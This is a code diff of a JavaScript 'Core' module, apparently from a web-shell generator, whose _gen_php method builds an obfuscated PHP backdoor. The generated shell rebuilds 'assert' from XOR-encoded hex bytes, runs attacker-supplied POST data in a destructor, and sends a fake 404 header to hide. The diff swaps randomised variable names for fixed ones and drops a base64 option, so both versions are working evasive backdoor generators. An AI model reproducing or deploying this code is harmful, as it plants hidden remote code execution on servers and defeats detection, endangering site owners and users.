@@ -1,5 +1,5 @@
 /**
- * 核心模块 Core:3.2
+ * 核心模块 Core:2.0
  */
 
 class Core {
@@ -24,44 +24,24 @@ class Core {
 
   // 生成 php shell
   _gen_php(pwd) {
-    function random_name(len) {
-      len = len || 8;
-      let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-      let maxPos = chars.length;
-      let pwd = '';
-      for (var i = 0; i < len; i++) {
-          pwd += chars.charAt(Math.floor(Math.random() * maxPos));
-      }
-      return pwd;
-  }
     let key = [0, 0, 0, 0, 0, 0].map(t => parseInt(Math.random() * 256));
     let cipher = "assert".split("").map(t => t.charCodeAt(0)).map((t, i) => t ^ key[i]);
     cipher = cipher.map(t => "\\x" + t.toString(16));
     key = key.map(t => "\\x" + t.toString(16));
-    let random_names=[];
-    for (var i=0;i<6;i++){
-        random_names.push(random_name(4));
-    }
-    let lines = random_names.map((t, i) => `        $${t} = "${cipher[i]}" ^ "${key[i]}";`).join("\r\n");
-    let name = random_name(4).toUpperCase();
-    let random_var=random_name(4);
-    let func_name=random_name(4);
-    let random_var2=random_name(4);
-    let random_var3=random_name(2);
+    let lines = [0, 1, 2, 3, 4, 5].map((t, i) => `        $_${t} = "${cipher[i]}" ^ "${key[i]}";`).join("\r\n");
+    let name = [65, 65, 65, 65].map((t) => String.fromCharCode(parseInt(Math.random() * 26) + t)).join("");
     let code = `<?php 
+header('HTTP/1.1 404');
 class ${name} { 
-    function ${func_name}() {
+    public $c='';
+    function __destruct() {
 ${lines}
-        $${random_var} =${random_names.map((t, i) => `$${t}`).join(".")};
-        return $${random_var};
-    }
-    function __destruct(){
-        $${random_var2}=$this->${func_name}();
-        @$${random_var2}($this->${random_var3});
+        $db =${[0, 1, 2, 3, 4, 5].map((t, i) => `$_${t}`).join(".")};
+        return @$db($this->c);
     }
 }
 $${name.toLowerCase()} = new ${name}();
-@$${name.toLowerCase()}->${random_var3} = isset($_GET['id'])?base64_decode($_POST['${pwd}']):$_POST['${pwd}'];
+@$${name.toLowerCase()}->c = $_POST['${pwd}'];
 ?>`
     return code;
   }
@@ -127,7 +107,16 @@ EXecutE(${funcName}("${payload.split("").map(chr => chr.charCodeAt(0)).map(code 
     return Math.floor(Math.random() * (m - n + 1) + n);
   }
   // 随机产生指定长度字符串
-
+  _randomStr(len) {
+    len = len || 8;
+    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    let maxPos = chars.length;
+    let pwd = '';
+    for (var i = 0; i < len; i++) {
+      pwd += chars.charAt(Math.floor(Math.random() * maxPos));
+    }
+    return pwd;
+  }
 }
 
 module.exports = Core;
